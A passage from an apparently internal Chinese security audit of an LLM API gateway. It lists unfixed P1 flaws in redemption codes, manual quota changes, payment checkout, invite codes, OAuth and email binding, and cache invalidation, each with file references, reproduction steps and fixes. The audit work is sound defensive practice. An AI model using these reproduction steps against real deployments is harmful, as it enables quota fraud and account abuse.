  - `model/redemption.go:164-170`：兑换时只检查 `Status == RedemptionCodeStatusEnabled` 和过期时间，不检查 `UsedUserId` 或 `RedeemedTime`
  - `model/redemption.go:196-199`：兑换成功后才设置 `RedeemedTime/UsedUserId/Status=used`
  - `web/default/src/features/redemption-codes/components/data-table-row-actions.tsx:54-78`：新版前端禁用 used 行的启用/禁用按钮，这是正向约束但不是后端边界
  - `web/classic/src/components/table/redemptions/RedemptionsColumnDefs.jsx:168-177`：classic 前端也禁用 used 行启用按钮，这是正向约束但 API 可绕过
- 可能后果：已使用兑换码可以被重新启用并再次兑换，造成同一兑换码重复发额度或重复发套餐。因为 `used_user_id/redeemed_time` 会被下一次兑换覆盖，原始兑换人信息也会丢失，事故追踪更困难。
- 复现思路：创建 quota 兑换码并由用户 A 兑换；调用 status-only 接口把该码 status 改回 1；用户 B 再兑换同一个 key。观察用户 B 获得资产，兑换码 `used_user_id` 被覆盖为 B。
- 修复建议：后端将兑换码状态机固化为只允许 enabled <-> disabled，禁止 used 转 enabled。`Redeem` 应同时要求 `used_user_id=0`、`redeemed_time=0`。如果确实需要重置已用码，应走单独的 Root 高危接口，清空使用字段并写审计记录。
- 优先级：P1
- 当前状态：已确认兑换码状态接口缺少后端状态机校验，尚未修复。

### 风险 119：管理员扣减和覆盖额度缺少余额下限与上限校验，可把用户 quota 调成负数或极大值

- 标题：手动调额接口只要求 add/subtract 的 value 大于 0，override 允许任意整数；subtract 不检查当前余额是否足够，override 不限制负数和上限
- 影响范围：管理员用户管理、用户 quota、消费权限、客服补偿、误操作恢复、余额展示和后续计费
- 触发条件：管理员在用户管理中选择 subtract，扣减值大于用户当前余额；或选择 override 输入负数/极大数；或者脚本直接调用 `/api/user/manage`
- 涉及文件/函数：
  - `controller/user.go:955-985`：add/subtract 仅校验 `req.Value > 0`
  - `controller/user.go:985-992`：override 直接把 `quota` 更新为 `req.Value`
  - `model/user.go:1034-1052`：`DecreaseUserQuota` 只拒绝负数参数，不检查扣减后余额是否为负
  - `web/default/src/features/users/components/user-quota-dialog.tsx:77-90`、`159-167`：新版前端 override 输入没有 min，subtract 只要求输入为正
  - `web/classic/src/components/table/users/modals/EditUserModal.jsx:169-180`、`511-549`：classic 前端 override 同样允许负数输入
- 可能后果：管理员误操作可以把用户余额扣成负数，后续用户付款、退款、消费和余额展示都要在负余额基础上运行；极大 override 可能造成异常资产、整数边界风险和难以追踪的人工资产发放。若业务允许负余额，也缺少明确的“欠费/冻结/人工调整”状态来区分。
- 复现思路：创建余额为 100 的用户，调用 `/api/user/manage`，`action=add_quota, mode=subtract, value=100000`；查询用户 quota 变为负数。再用 override 设置极大值，观察后续消费和展示。
- 修复建议：为手工调额定义资产策略：默认不允许扣成负数，override 必须在 `[0, max_manual_quota]` 内；确需负余额时使用独立 `debt_quota` 或 `manual_adjustment` 状态，并要求二次确认和原因。所有值应做 int 范围校验。
- 优先级：P1
- 当前状态：已确认手工调额缺少余额下限和上限校验，尚未修复。

### 风险 120：手动加减额度先异步更新 Redis quota 缓存再写 DB，override 则只写 DB 不刷新 quota 缓存，容易出现缓存/数据库不一致

- 标题：`IncreaseUserQuota/DecreaseUserQuota` 在 DB 成功前异步改缓存；override 绕过这些函数直接更新 DB；Redis 启用时用户后续请求可能读到旧余额或错误余额
- 影响范围：用户 quota 缓存、TokenAuth/请求计费、管理员手动调额、充值/退款补偿、Redis 多实例部署
- 触发条件：Redis 启用；管理员 add/subtract 调额时 DB 更新失败但缓存已增减；管理员 override 调额后用户缓存仍存在旧 quota；用户在缓存 TTL 内继续发起请求
- 涉及文件/函数：
  - `model/user.go:1009-1023`：`IncreaseUserQuota` 先 `gopool.Go(cacheIncrUserQuota)`，再写 DB
  - `model/user.go:1034-1048`：`DecreaseUserQuota` 同样先异步扣 Redis，再写 DB
  - `model/user_cache.go:79-118`：`GetUserCache` 优先读取 Redis，失败才回源 DB
  - `model/user_cache.go:135-143`：缓存层通过 `HIncrBy` 增减 `Quota`
  - `model/user_cache.go:199-203`：存在设置 quota cache 的 helper，但手工 override 没调用
  - `controller/user.go:985-992`：override 直接 `Update("quota", req.Value)`，未调用 `updateUserQuotaCache` 或 `InvalidateUserCache`
  - `controller/user.go:1008-1015`：disable/promote/demote 会失效用户缓存，但 add_quota 分支提前 return，不做整体 cache invalidation
- 可能后果：管理员把用户余额覆盖为 0 后，Redis 里仍可能是旧的高余额，用户在缓存有效期内继续消费；或 add/subtract 的 DB 写失败但缓存已改变，短时间形成“缓存有钱、DB 没钱”或反向的不一致。多实例下问题更难排查。
- 复现思路：启用 Redis，让用户缓存预热；管理员 override quota 为 0；随后立即触发依赖 `GetUserCache` 的鉴权/消费路径，观察上下文 quota 可能仍为旧值。另可模拟 DB 更新失败，观察 `IncreaseUserQuota` 已尝试更新缓存。
- 修复建议：资产变更必须以 DB 事务为准，DB 成功后同步或事务后可靠刷新/失效缓存。override 应调用统一的 `SetUserQuota` 服务，写 DB 后 `updateUserQuotaCache` 或 `InvalidateUserCache`；add/subtract 也应在 DB 成功后再更新缓存，失败时不碰缓存。
- 优先级：P1
- 当前状态：已确认手工调额存在缓存与 DB 更新顺序不一致，尚未修复。

### 风险 126：充值信息接口会隐藏不可用支付方式，但多个实际下单接口没有复用启用条件，旧客户端可创建不可自动完成的支付订单

- 标题：`GetTopUpInfo` 用 `is*TopUpEnabled()` 计算前端可见支付方式；但 Epay、Stripe、Creem、Waffo 的实际下单接口没有统一检查合规确认、webhook secret 和密钥完整性
- 影响范围：Epay/Stripe/Creem/Waffo 普通充值、支付合规确认、webhook 自动入账、订单 pending/failed 清理、客服补单和支付事故排查
- 触发条件：支付合规未确认但历史配置仍存在；或 Stripe/Creem 等缺少 webhook secret；或 Waffo 缺少当前 sandbox/prod 所需证书但 `WaffoEnabled=true`；普通用户使用旧前端、脚本或直接 API 调用隐藏的支付接口
- 涉及文件/函数：
  - `controller/topup.go:24-45`、`99-118`：充值信息接口按合规确认和 `is*TopUpEnabled()` 返回前端启用状态、支付方式和最小充值
  - `controller/payment_webhook_availability.go:14-21`：Stripe 启用条件要求合规确认、API secret、webhook secret、price id
  - `controller/payment_webhook_availability.go:31-47`：Creem 展示启用和 webhook 启用条件不一致，风险 108 已单独记录
  - `controller/payment_webhook_availability.go:49-58`：Waffo 启用条件要求合规确认、`WaffoEnabled` 和当前环境证书完整
  - `controller/payment_webhook_availability.go:95-100`：Epay 启用条件要求合规确认、webhook 配置和支付方式列表
  - `controller/topup.go:189-227`：Epay 下单只检查金额、`ContainsPayMethod` 和 `GetEpayClient`，未检查 `isEpayTopUpEnabled`
  - `controller/topup_stripe.go:64-100`、`137-145`：Stripe 下单未检查 `isStripeTopUpEnabled`，`genStripeLink` 只会在创建 session 时暴露部分配置错误
  - `controller/topup_creem.go:66-130`、`144-165`：Creem 下单未检查 `isCreemTopUpEnabled` 或 `isCreemWebhookEnabled`
  - `controller/topup_waffo.go:132-136`、`225-231`：Waffo 下单只检查 `WaffoEnabled`，SDK 初始化失败后才把本地订单标 failed
  - `controller/topup_waffo_pancake.go:348-352`：Waffo Pancake 是正向对照，入口先检查 `isWaffoPancakeTopUpEnabled`
- 可能后果：运营以为支付方式已因合规未确认或 webhook 缺失而关闭，但旧客户端仍可能拉起支付或至少创建本地 pending 订单；支付成功后 webhook 可能被禁用条件拒绝，或者支付侧 session 已创建但本地订单/回调无法自动完成，形成“用户已支付但不到账”“支付入口隐藏但仍可调用”的运营事故。该问题也会放大已有的 orphan payment、pending 悬挂和手工补单风险。
- 复现思路：保留 Stripe API secret 和 price id，但清空 webhook secret 或关闭合规确认；调用 `/api/user/stripe/pay` 而不是依赖 `/api/user/topup/info` 展示。类似地，Epay 保留 `PayMethods/EpayId/EpayKey/PayAddress` 但合规未确认后直接调用 `/api/user/pay`；观察是否仍能进入下单流程或创建本地订单。
- 修复建议：所有支付下单和金额预估接口都应在后端统一调用对应 `is*TopUpEnabled()`，并返回明确的配置不可用原因；前端可见性只能作为展示，不是安全边界。建议建立 `PaymentProviderStatus` 服务，统一输出 `canDisplay/canCreateCheckout/canHandleWebhook/reasons`，下单前要求 `canCreateCheckout && canHandleWebhook`。合规未确认时所有普通充值、订阅购买和兑换码资产入口都应 fail closed。
- 优先级：P1
- 当前状态：已确认多个下单入口没有复用支付启用条件，尚未修复。

### 风险 127：Stripe 金额预估使用 `StripeUnitPrice/discount`，但本地订单和入账统计保存的是 `amount * groupRatio`，收入与到账口径可能长期不一致

- 标题：`/stripe/amount` 返回的展示支付金额、Stripe Checkout 的 PriceId 实际扣款、本地 `top_ups.money`、最终 `quotaToAdd` 和 `topup_money` 使用不同字段组合
- 影响范围：Stripe 普通充值、用户实际到账额度、`top_ups.money`、`users.topup_money`、充值分析报表、邀请充值返利、客服对账和促销折扣
- 触发条件：`StripeUnitPrice != 1`；Stripe PriceId 单价与本地 `StripeUnitPrice` 不一致；开启 `AmountDiscount` 或 Stripe promotion codes；用户分组存在 `TopupGroupRatio`；用户通过 `/stripe/amount` 看到一个金额后实际进入 Stripe Checkout
- 涉及文件/函数：
  - `setting/payment_stripe.go:3-7`：本地有 `StripePriceId` 和 `StripeUnitPrice`
  - `controller/topup_stripe.go:45-61`：`/stripe/amount` 用 `getStripePayMoney` 返回预估支付金额
  - `controller/topup_stripe.go:397-415`：`getStripePayMoney` 使用展示模式、`StripeUnitPrice`、充值分组倍率和 `AmountDiscount`
  - `controller/topup_stripe.go:341-380`：Stripe Checkout 实际使用 `PriceId + Quantity(amount)`，不读取 `StripeUnitPrice`
  - `controller/topup_stripe.go:88-105`：创建本地订单时 `TopUp.Money = GetChargedAmount(amount, user)`，只包含 `amount * TopupGroupRatio`
  - `controller/topup_stripe.go:388-395`：`GetChargedAmount` 不包含 `StripeUnitPrice`、展示模式转换或折扣
  - `model/topup.go:205-231`：Stripe 入账按本地 `topUp.Money * QuotaPerUnit` 加额度
  - `model/user.go:267-277`、`model/topup.go:331-345`：`topup_money` 和充值分析按 success `top_ups.money` 汇总
- 可能后果：用户看到的预估支付金额、Stripe 实际扣款和本地收入统计可能不是同一个数；`topup_money` 作为累计充值金额会低估或高估 Stripe 收入，影响用户排序、等级策略、返利审核和财务报表。折扣或 promotion code 场景下，本地既没有支付侧实付金额快照，也没有把折扣口径写入 `TopUp.Money`，运营很难解释“支付了多少、到账多少、统计了多少”。
- 复现思路：设置 `StripeUnitPrice=8`，用户分组倍率为 1，调用 `/api/user/stripe/amount` 传 `amount=10`，观察返回约 80；再创建 Stripe 订单，查询本地 `top_ups.money` 为 10，成功回调后用户增加 `10 * QuotaPerUnit`，`topup_money` 也按 10 统计。
- 修复建议：创建 Stripe Checkout 前生成统一价格快照：display_amount、stripe_unit_price、stripe_price_id、expected_total、currency、discount、topup_group_ratio、quota_to_add。`/stripe/amount`、Checkout、`TopUp.Money`、入账和报表都应引用同一快照。若 Stripe PriceId 单价才是真实价格，应通过 Stripe API 读取 Price 金额或在配置保存时校验 `StripeUnitPrice` 与 PriceId 一致；促销码/折扣要明确是支付折扣还是额度折扣，并写入订单。
- 优先级：P1
- 当前状态：已确认 Stripe 预估、支付、入账和统计口径不统一，尚未修复。

### 风险 131：邀请额度划转用旧式行锁和整行 Save，存在并发超转和字段覆盖风险

- 标题：`TransferAffQuotaToQuota` 在事务内用 `Set("gorm:query_option", "FOR UPDATE")` 读取用户，再在内存中扣 `aff_quota`、加 `quota` 并 `Save(user)`；如果行锁未按预期生效，并发请求可基于同一份邀请余额判断通过
- 影响范围：用户邀请返利余额、主余额、API 调用额度、邀请奖励结算、运营对账、用户资料字段
- 触发条件：同一用户同时发起多次 `/api/user/aff_transfer`；数据库方言或 GORM v2 对 `gorm:query_option` 不生成真实 `FOR UPDATE`；或连接/事务层面对行锁支持不完整。前端按钮禁用只能限制正常 UI，不能限制并发 HTTP 请求。
- 涉及文件/函数：
  - `router/api-router.go:79-109`：`/api/user/aff_transfer` 在登录用户路由下，但没有 `CriticalRateLimit`
  - `controller/user.go:358-379`：`TransferAffQuota` 读取当前用户并调用模型层划转
  - `model/user.go:466-500`：`TransferAffQuotaToQuota` 用旧式 `Set("gorm:query_option", "FOR UPDATE")` 查询、内存修改 `AffQuota/Quota`，最后 `tx.Save(user)`
  - `model/user.go:467-488`：有最小额度和单次余额不足校验，但校验依赖事务内读到的 `AffQuota`
  - `go.mod:60`：当前使用 `gorm.io/gorm v1.25.2`，仓库中其他锁路径也大量使用同一 `gorm:query_option` 写法
  - `web/default/src/features/wallet/components/dialogs/transfer-dialog.tsx:75-93`、`web/classic/src/components/topup/index.jsx:739-747`：前端按可用邀请额度限制输入并提交，但后端仍需承担最终并发一致性
- 可能后果：用户只有一笔可划转邀请余额时，多请求同时通过余额检查，可能出现重复把同一份 `aff_quota` 转入主余额；如果最后一次 `Save` 覆盖先前写入，也可能造成主余额、邀请余额和历史展示不一致。由于 `Save(user)` 是整行保存，若事务内对象携带其他旧字段，还可能覆盖并发发生的资料、分组、状态等字段变更，扩大资产操作的副作用。
- 复现思路：本地构造用户 `aff_quota = 100000`、`quota = 0`，并发发起两次 `quota=100000` 的 `/api/user/aff_transfer`；打开 SQL 日志确认查询是否带真实 `FOR UPDATE`。如果没有真实锁，观察两次是否都返回成功，以及最终 `quota/aff_quota` 是否与预期只划转一次一致。
- 修复建议：不要依赖整行读改写。改为单条条件更新或明确锁语法：`UPDATE users SET aff_quota = aff_quota - ?, quota = quota + ? WHERE id = ? AND aff_quota >= ?`，并检查 `RowsAffected == 1`；必要时使用 `Clauses(clause.Locking{Strength: "UPDATE"})` 并通过 SQL 日志验证。避免 `Save(user)` 整行保存，仅更新 `aff_quota` 和 `quota` 两列；给该接口增加用户级 rate limit 或幂等保护。
- 优先级：P1
- 当前状态：基于代码确认存在并发一致性风险，尚未通过 SQL 日志验证具体方言下 `FOR UPDATE` 是否生效。

### 风险 133：普通用户自助创建邀请码可提交任意 `max_uses`，每日创建数量限制不能限制实际可邀请人数

- 标题：`CreateSelfInviteCodes` 只限制一次创建数量和每日创建码数量，没有对普通用户提交的 `max_uses` 设置上限；用户可创建一个超大可用次数的邀请码
- 影响范围：普通用户自助邀请码、邀请注册奖励、邀请返利资格、垃圾注册/羊毛注册、运营风控
- 触发条件：普通登录用户直接调用 `/api/user/invite_codes`，提交 `{"count":1,"max_uses":1000000}`；系统允许邀请码注册或用户主动传播该邀请码；`QuotaForInviter/QuotaForInvitee` 或充值返利开启。
- 涉及文件/函数：
  - `router/api-router.go:94-96`：普通用户可访问自助邀请码列表和创建接口
  - `controller/invite.go:87-93`：请求结构包含 `MaxUses`
  - `controller/invite.go:103-151`：`buildInviteCodeCreateParams` 对 `Count` 上限为 100，对普通用户只按 `InviteCodeDailyLimit` 限制创建码数量；`MaxUses <= 0` 才改为 1，没有普通用户上限
  - `controller/invite.go:154-169`：`CreateSelfInviteCodes` 复用该参数构造逻辑
  - `model/invite_code.go:70-125`：`CreateInviteCodes` 按传入 `MaxUses` 落库，也只在 `<=0` 时改为 1
  - `web/default/src/features/wallet/hooks/use-affiliate.ts:51-59`：默认前端自助创建固定传 `max_uses: 1`，但后端没有把这个限制作为权限规则
  - `model/user.go:608-616`：注册后邀请奖励在事务后发放，配置开启时会给邀请人累计 `aff_quota`
- 可能后果：普通用户可用一个邀请码承载大量注册，绕过“每日最多创建几个邀请码”的运营意图；如果注册门槛较低、邮箱/OAuth 可批量化，邀请人可累积大量邀请额度或充值返利资格。即使没有直接资产发放，也会削弱 invite-only 注册和反滥用策略。
- 复现思路：以普通用户登录，本地调用 `POST /api/user/invite_codes`，body 传 `count=1,max_uses=999999`；查询 `invite_codes.max_uses` 是否落库为该值。再用该码多次注册，观察 `used_count` 是否持续增加直到超大上限。
- 修复建议：区分管理员和普通用户能力。普通用户自助创建应强制 `max_uses=1` 或受独立配置限制，例如 `InviteCodeUserMaxUses`；每日限制应按“新增可用使用次数”计算，而不是只按邀请码条数计算。管理员批量码可保留较高 `max_uses`，但需二次确认和审计日志。
- 优先级：P1
- 当前状态：已确认后端未限制普通用户自助邀请码 `max_uses`，尚未修复。

### 风险 135：邀请码消费用旧式行锁和读改写，`max_uses` 可能在并发注册下被超用

- 标题：注册事务内先查邀请码、创建用户，再调用 `ConsumeRegistrationInviteCodeWithTx` 增加 `used_count`；消费函数仍使用 `Set("gorm:query_option", "FOR UPDATE")` 和 `Save`，如果锁未生效，多次注册可同时通过 `used_count < max_uses`
- 影响范围：邀请码注册、invite-only 注册、邀请奖励、邀请返利资格、用户创建事务、运营反滥用
- 触发条件：多个注册请求同时使用同一个剩余次数很少的邀请码；GORM 旧式 `gorm:query_option` 未生成真实行锁；数据库隔离级别不能防止读改写丢失。
- 涉及文件/函数：
  - `controller/user.go:190-201`：普通注册在同一事务中获取邀请人、创建用户、消费邀请码
  - `controller/oauth.go:280-339`：OAuth 注册也在事务中获取邀请人、创建用户/绑定、消费邀请码
  - `controller/invite.go:22-35`：`getInviterIdForRegistrationWithTx` 先验证邀请码并返回邀请人
  - `model/invite_code.go:266-288`：`GetInviterIdByRegistrationInviteCodeWithTx` 用旧式 `FOR UPDATE` 读取并验证 `used_count/max_uses`
  - `model/invite_code.go:295-320`：`ConsumeRegistrationInviteCodeWithTx` 再次用旧式 `FOR UPDATE` 读取、`UsedCount++`、保存整行
  - `model/user.go:589-618`：事务提交后 `FinalizeOAuthUserCreation` 根据 inviterId 发放邀请奖励
- 可能后果：一个 `max_uses=1` 的邀请码在并发注册下可能创建多个成功用户，并且这些用户都携带同一邀请人；事务后奖励发放也可能执行多次。最终 `invite_codes.used_count` 可能只保存最后一次写入的值，运营界面看起来只使用一次，但实际已有多个用户注册并触发奖励。
- 复现思路：本地创建 `max_uses=1` 的邀请码，使用并发请求同时走普通注册或 OAuth 注册回调模拟；观察是否出现多个用户 `inviter_id` 相同且都注册成功，`invite_codes.used_count/status/used_user_id` 是否只能反映最后一次消费。
- 修复建议：把消费改成条件更新：`UPDATE invite_codes SET used_count = used_count + 1, ... WHERE code = ? AND status = enabled AND (max_uses <= 0 OR used_count < max_uses) AND not expired`，并检查 `RowsAffected == 1`；多次使用码不要只更新单个 `used_user_id`，应插入 `invite_code_usages` 唯一流水。用 SQL 日志验证真实锁语句，或避免依赖读改写锁。
- 优先级：P1
- 当前状态：基于代码确认存在并发超用风险，尚未通过并发测试复现。

### 风险 137：内置 OAuth 标识字段只有普通索引，同一第三方账号并发回调可创建多个本地用户并重复触发邀请奖励

- 标题：GitHub/Discord/OIDC/WeChat/Telegram 等内置 OAuth 字段没有唯一约束，注册路径是先查 `Is*IdAlreadyTaken` 再创建用户；并发 OAuth 回调存在双建窗口
- 影响范围：OAuth 注册、invite-only 注册、邀请奖励、用户身份唯一性、账号风控、用户资产归属
- 触发条件：同一个第三方账号的 OAuth callback 被并发提交，或浏览器/网络重试导致同一授权 code/身份在短时间内进入创建流程；数据库没有对内置 OAuth ID 建唯一索引。
- 涉及文件/函数：
  - `model/user.go:91-96`：`Email/GitHubId/DiscordId/OidcId/WeChatId/TelegramId` 都是普通 `index`，不是唯一索引
  - `model/user.go:814-831`：`IsWeChatIdAlreadyTaken/IsGitHubIdAlreadyTaken/IsDiscordIdAlreadyTaken/IsOidcIdAlreadyTaken/IsTelegramIdAlreadyTaken` 只做查询判断
  - `controller/oauth.go:211-348`：通用 OAuth 先 `provider.IsUserIDTaken`，未占用时创建用户并写内置 provider id
  - `controller/github.go:111-151`、`controller/discord.go:130-161`、`controller/linuxdo.go:201-237`、`controller/oidc.go:132-164`、`controller/wechat.go:74-110`：旧 OAuth 入口同样是查后创建
  - `model/user_oauth_binding.go:11-16`：自定义 OAuth binding 表有 provider/user 唯一约束，说明内置 OAuth 字段缺少同等级数据库保护
  - `model/user.go:608-616`：用户创建事务提交后会按 inviterId 发放邀请奖励
- 可能后果：同一第三方账号可能对应多个本地用户，破坏“一个外部身份一个账户”的风控假设；如果注册时携带邀请码，多个本地用户都可能触发邀请奖励和新用户赠送额度。后续登录 `FillUserBy*Id` 只取第一条记录，其他重复账号可能成为难以管理的幽灵资产账户。
- 复现思路：在本地模拟同一个 provider user id 的两个 OAuth 注册事务并发执行，或直接绕过 provider 调用创建逻辑；观察是否能插入两条相同 `github_id/discord_id/oidc_id/wechat_id` 的用户记录，以及邀请奖励是否重复发放。
- 修复建议：为非空内置 OAuth 标识增加唯一约束或部分唯一索引；创建路径使用数据库唯一约束兜底，捕获冲突后重新查询已存在用户。对 `Is*AlreadyTaken` 改为 `count > 0` 并保留唯一约束迁移前的数据清理脚本。注册奖励发放前应确认用户创建不是重复外部身份。
- 优先级：P1
- 当前状态：已确认内置 OAuth 字段没有唯一约束，尚未修复。

### 风险 138：邮箱绑定不检查唯一性且验证码可重复使用，可能制造重复邮箱并影响密码重置和账号归属

- 标题：`EmailBind` 验证邮箱验证码后直接更新当前用户邮箱，不检查该邮箱是否已绑定其他用户；邮箱验证码验证成功后也不删除，可在有效期内重复用于多个账号绑定
- 影响范围：邮箱登录、密码重置、OAuth 账号补邮箱、账号恢复、反滥用、用户资产归属
- 触发条件：用户拿到某邮箱的验证代码后，在 10 分钟有效期内对多个已登录账号调用 `/api/oauth/email/bind`；OAuth 注册或旧数据导入也可能已有重复邮箱；密码重置按邮箱批量更新。
- 涉及文件/函数：
  - `model/user.go:91`：`Email` 只有普通索引
  - `common/verification.go:47-56`：`VerifyCodeWithKey` 只比较验证码，不消费/删除验证码
  - `controller/misc.go:237-305`：发送注册邮箱验证码前会检查邮箱是否已被占用
  - `controller/user.go:1037-1062`：`EmailBind` 验证 code 后直接 `user.Email = email`，注释明确认为“不需要检查邮箱是否已占用”
  - `model/user.go:834-843`：`ResetUserPasswordByEmail` 使用 `Where("email = ?").Update("password", ...)`，会更新匹配该邮箱的用户
  - `controller/misc.go:342-365`：重置密码只按 email/token 验证并调用按邮箱更新
  - `model/user.go:810-812`：`IsEmailAlreadyTaken` 用 `RowsAffected == 1` 判断，重复邮箱数据出现后语义不稳定
- 可能后果：多个账号可绑定同一邮箱，邮箱登录、找回密码和客服确认身份时无法唯一定位账户；一封密码重置邮件可能把同一邮箱下多个账号的密码一起改掉，或在重复邮箱数量异常时触发“是否已占用”判断失真。对运营来说，这会削弱按邮箱限制批量注册、邀请套利和账号恢复的可靠性。
- 复现思路：开启邮箱验证，给 `a@example.com` 发送一次验证码；登录账号 A 调用 `EmailBind` 绑定该邮箱，再登录账号 B 在验证码有效期内用同一 code 绑定同一邮箱；随后调用密码重置，观察 `users` 表中同邮箱账号的密码是否被一起更新。
- 修复建议：`EmailBind` 必须在事务中检查邮箱唯一性，并为 `users.email` 增加非空唯一约束或部分唯一索引；验证码验证成功后立即 `DeleteKey(email, EmailVerificationPurpose)`，防止复用。密码重置应先唯一定位用户 id，再按 id 更新密码；发现重复邮箱数据时拒绝自动重置并进入人工处理。
- 优先级：P1
- 当前状态：已确认邮箱绑定缺少唯一性检查且验证码不消费，尚未修复。

### 风险 140：普通注册默认 token 创建失败会在用户和邀请奖励已落库后返回失败，形成半成品账号和重复重试空间

- 标题：普通注册先在事务中创建用户并消费邀请码，随后执行邀请奖励/侧边栏初始化，最后才创建默认 token；默认 token 失败时接口返回注册失败，但用户、初始额度和邀请奖励已经提交
- 影响范围：普通密码注册、默认 token、邀请奖励、新用户初始额度、客服排障、重复注册尝试
- 触发条件：`GENERATE_DEFAULT_TOKEN=true`；默认 token 的 key 生成或 `tokens` 表插入失败；数据库短暂异常或唯一键冲突；用户看到注册接口失败后用同一邀请码/邮箱/用户名重试。
- 涉及文件/函数：
  - `controller/user.go:190-201`：用户创建和邀请码消费在事务内提交
  - `controller/user.go:209`：事务成功后调用 `FinalizeOAuthUserCreation` 发放注册日志、邀请人/被邀请人奖励和侧边栏初始化
  - `controller/user.go:211-236`：默认 token 创建在上述步骤之后执行，失败时直接返回 `MsgCreateDefaultTokenErr`
  - `model/user.go:591-616`：后置任务会记录新用户赠送，并在合规开启时发放 `QuotaForInvitee/QuotaForInviter`
  - `model/token.go:279-282`：`Token.Insert` 只是普通 `DB.Create`
  - `common/init.go:147-148`：`GENERATE_DEFAULT_TOKEN` 默认关闭，但一旦开启会影响所有新注册用户
- 可能后果：用户收到“创建默认 token 失败”并认为注册失败，但数据库中账号已存在，邀请码也可能已消耗，邀请奖励也可能已发放；用户重试会遇到用户名/邮箱已存在或邀请码已使用，形成客服工单。若攻击者能诱导 token 插入失败，可制造大量半成品账号和邀请奖励/邀请码消耗记录。
- 复现思路：本地开启 `GENERATE_DEFAULT_TOKEN=true`，在 `tokens.key` 上制造唯一冲突或临时让 token insert 返回错误；调用注册接口，观察响应失败后 `users`、`invite_codes.used_count`、邀请人 `aff_quota` 和日志是否已经改变。
- 修复建议：默认 token 创建应纳入同一个注册事务，或者改为注册成功后的可重试异步任务并向用户返回明确状态；失败时不得把整体注册伪装成失败而留下已创建账号。邀请奖励应在所有必须步骤成功后发放，或用幂等注册状态机标记 `pending/active/failed`。
- 优先级：P1
- 当前状态：已确认默认 token 创建位于用户创建和奖励发放之后，尚未修复。

### 风险 141：默认初始 token 是永不过期无限额度，启用后会批量发放长期高风险凭证

- 标题：`GENERATE_DEFAULT_TOKEN` 启用时，新注册用户自动获得 `ExpiredTime=-1`、`UnlimitedQuota=true`、无模型限制的初始 token；`RemainQuota=500000` 只是展示值，不限制 token 额度
- 影响范围：新用户默认 API key、用户额度扣费、OpenAI 兼容 billing 展示、泄露 token 的滥用半径、默认分组/auto 分组路由
- 触发条件：运营开启 `GENERATE_DEFAULT_TOKEN=true`；新用户注册成功；默认 token 泄露、被脚本批量创建账号获取，或配合邀请码/OAuth 并发重复注册风险。
- 涉及文件/函数：
  - `controller/user.go:219-229`：默认 token 字段固定为永不过期、`RemainQuota=500000`、`UnlimitedQuota=true`、`ModelLimitsEnabled=false`
  - `controller/user.go:230-232`：`DefaultUseAutoGroup` 开启时默认 token 直接进入 `auto` 分组
  - `middleware/auth.go:413-420`：无限 token 不设置 `token_quota`
  - `service/pre_consume_quota.go:47-63`：用户额度高于 trust quota 时，无限 token 会跳过预扣 token 额度
  - `service/quota.go:141-146`：realtime 路径仍检查用户总额度，但无限 token 不检查 token 剩余额度
  - `controller/billing.go:56-58`：无限 token 的 OpenAI 兼容订阅软限额显示为 `100000000`
  - `common/init.go:147-148`：该能力由环境变量控制，默认关闭
- 可能后果：一旦运维误开启，所有新注册用户都会拥有长期有效、无 token 级额度上限、无模型限制的 API key；用户总余额仍会参与多数扣费校验，但 token 级限额、过期和模型限制失去默认防线。配合批量注册、OAuth 身份并发双建或邀请码奖励漏洞，滥用半径会明显放大。
- 复现思路：开启 `GENERATE_DEFAULT_TOKEN=true` 注册新用户；查询 `tokens` 表，确认初始 token 的 `expired_time=-1`、`unlimited_quota=true`、`model_limits_enabled=false`。再调用 billing/subscription 或 relay 预扣链路，观察 token 级额度是否被跳过。
- 修复建议：默认 token 不应使用无限额度和永不过期。改为短期有效、有限 token 额度、继承用户默认模型限制，并在首次登录时提示用户主动创建正式 token；至少增加后台显式高危确认和启动日志告警。若保留该开关，应支持配置默认过期时间、默认 token 额度、默认模型白名单和是否允许 auto 分组。
- 优先级：P1
- 当前状态：已确认默认 token 配置为无限额度且永不过期；该路径默认关闭，但开启后风险高。

### 风险 142：默认管理后台硬删除用户不清理 token/user 缓存，已缓存 API key 可能在 TTL 内继续通过鉴权

- 标题：`DELETE /api/user/:id` 直接硬删除用户记录，但没有调用 `InvalidateUserCache` 或 `InvalidateUserTokensCache`；default 前端删除按钮默认走该硬删除接口
- 影响范围：管理员删除用户、API token 鉴权、Redis 用户缓存、Redis token 缓存、封禁/注销后的请求阻断
- 触发条件：Redis 缓存开启；目标用户在删除前已有 token 缓存和 user cache；管理员在 default 后台点击删除用户；该用户继续使用已缓存的 API key 在缓存 TTL 内请求 relay。
- 涉及文件/函数：
  - `router/api-router.go:143-147`：管理员硬删除接口 `DELETE /api/user/:id` 暴露在 `AdminAuth` 下
  - `controller/user.go:791-817`：`DeleteUser` 权限检查后调用 `model.HardDeleteUserById(id)`，没有缓存失效和审计
  - `model/user.go:447-452`：`HardDeleteUserById` 只执行 `DB.Unscoped().Delete(&User{}, "id = ?", id)`
  - `model/user.go:698-707`：软删除 `user.Delete()` 会清理 user cache，是正向对比
  - `controller/user.go:918-934`：`ManageUser` 的 `delete` 软删除路径会清理 token cache，是正向对比
  - `middleware/auth.go:332-380`：TokenAuth 先从 token cache 取 token，再从 user cache 判断 `Status`
  - `model/token.go:255-276`、`model/user_cache.go:79-118`：token/user cache 命中时不会读 DB
  - `web/default/src/features/users/api.ts:107-112`、`web/default/src/features/users/components/users-delete-dialog.tsx:42-48`：default 管理后台删除调用硬删除接口
  - `web/classic/src/components/table/users/modals/DeleteUserModal.jsx:34-35`：classic 管理后台删除走 `manageUser(..., "delete")` 软删除，是行为差异
- 可能后果：管理员以为已经永久删除用户，但该用户已缓存的 API key 在 Redis TTL 过期前仍可能通过 token 和 user cache 鉴权，继续消耗额度或访问模型；不同前端入口删除同一用户的安全效果不一致，运营排障时难以判断“删除后为什么还能请求”。
- 复现思路：开启 Redis，使用某用户 token 先发起一次请求以填充 `token:<hmac>` 和 `user:<id>` cache；在 default 后台或直接调用 `DELETE /api/user/:id` 硬删除该用户；立即用旧 token 再请求 relay，观察是否仍从缓存通过直到 TTL 到期。对比 `/api/user/manage` 的 `delete` 路径是否会立即失效。
- 修复建议：硬删除前先收集该用户所有 token key，事务提交后调用 `InvalidateUserCache` 和 `InvalidateUserTokensCache`；更稳妥的是废弃直接硬删除入口，统一走带状态机、缓存失效和审计日志的删除服务。TokenAuth 在 user cache 命中前也可维护短期 deleted-user bloom/版本号，或在高危删除后强制全局缓存版本递增。
- 优先级：P1
